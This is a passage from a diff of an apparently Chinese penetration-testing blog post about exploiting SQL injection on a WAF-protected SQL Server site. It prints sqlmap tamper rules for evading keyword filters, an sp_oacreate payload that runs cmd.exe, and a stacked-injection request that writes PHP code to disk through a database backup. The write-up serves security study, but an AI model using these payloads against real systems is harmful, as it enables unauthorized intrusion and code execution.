@@ -125,7 +125,7 @@
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1ea40c2f77061bc94c939aaf8a1c01a5.png" alt="2020-01-03-13-14-00"></p>
 <h2 id="0x04-xp_cmdshell">0x04 xp_cmdshell</h2>
 <p>到这一步的时候，我遇到了一个问题，SQLMAP调用exec master..xp_cmshell的时候被拦截了，因为后端还检测是否有<code>exec</code>、<code>master</code>，于是我还要将tamper加两句：</p>
-<pre><code>payload = payload.replace(&quot;exec&quot;,&quot;/***/Execute/***/&quot;)
+<pre tabindex="0"><code>payload = payload.replace(&quot;exec&quot;,&quot;/***/Execute/***/&quot;)
 payload = payload.replace(&quot;master..&quot;,&quot;/***//***/&quot;)
 </code></pre><p>最终结果：<code>/***/execute/***//***/xp_cmdshell/***/'whoami'</code></p>
 <p>点击发包，还是无法执行，被360拦截了！</p>
@@ -133,7 +133,7 @@ payload = payload.replace(&quot;master..&quot;,&quot;/***//***/&quot;)
 <p>这个Error Code 5 ，是Windows的错误代码，中文意思就是：“拒绝访问”。</p>
 <p>现在xp_cmdshell被拦截的很多了，但是sp_oacreate应该可以使用的：</p>
 <p>参考我之前写的一篇文章：<a href="https://payloads.online/archivers/2019-07-19/1">Regsvr32 ole对象</a></p>
-<pre><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;C:\who.txt'
+<pre tabindex="0"><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;C:\who.txt'
 </code></pre><blockquote>
 <p>后续我发现该服务器无法出网，还是站库分离</p>
 </blockquote>
@@ -142,7 +142,7 @@ payload = payload.replace(&quot;master..&quot;,&quot;/***//***/&quot;)
 <p>在写文件这块，我浪费了大量的时间，首先要确定能否向站点目录写文件，当前写文件的操作是否被拦截等等因素。</p>
 <p>一开始的思路是调用xp_cmdshell，采用echo去写，目前已无法执行命令，就此作罢，吸了一口芙蓉王，精神焕发，遂查到数据库备份的方式。</p>
 <p>提交：</p>
-<pre><code>{&quot;ClientType&quot;: &quot;&quot;, &quot;ClientGuid&quot;: &quot;09a37ee1-5ec3-46db-9279-4cb066622e8d&quot;, &quot;ModuleType&quot;: &quot;A2501';use test222;create table [dbo].[test2] ([cmd] [image]);insert/***/into/***/test2(cmd) values(0x3c3f70687020706870696e666f28293b3f3e);backup database test222 to disk='C:\test2.bak' WITH DIFFERENTIAL,FORMAT;-- &quot;, &quot;IsBackEnd&quot;: false }
+<pre tabindex="0"><code>{&quot;ClientType&quot;: &quot;&quot;, &quot;ClientGuid&quot;: &quot;09a37ee1-5ec3-46db-9279-4cb066622e8d&quot;, &quot;ModuleType&quot;: &quot;A2501';use test222;create table [dbo].[test2] ([cmd] [image]);insert/***/into/***/test2(cmd) values(0x3c3f70687020706870696e666f28293b3f3e);backup database test222 to disk='C:\test2.bak' WITH DIFFERENTIAL,FORMAT;-- &quot;, &quot;IsBackEnd&quot;: false }
 </code></pre><p>页面返回正常。</p>
 <p>但是，我的站点目录如果是中文呢？在Burp里处理就非常麻烦！</p>
 <p>还记得之前的IIS 7.5吗，<strong>IIS在接收到一个请求后，会自动将数据进行Unicode解码，如果流量设备、WAF不支持此特性的话，就可以进行绕过</strong>，这里我着重解决中文目录的问题。</p>
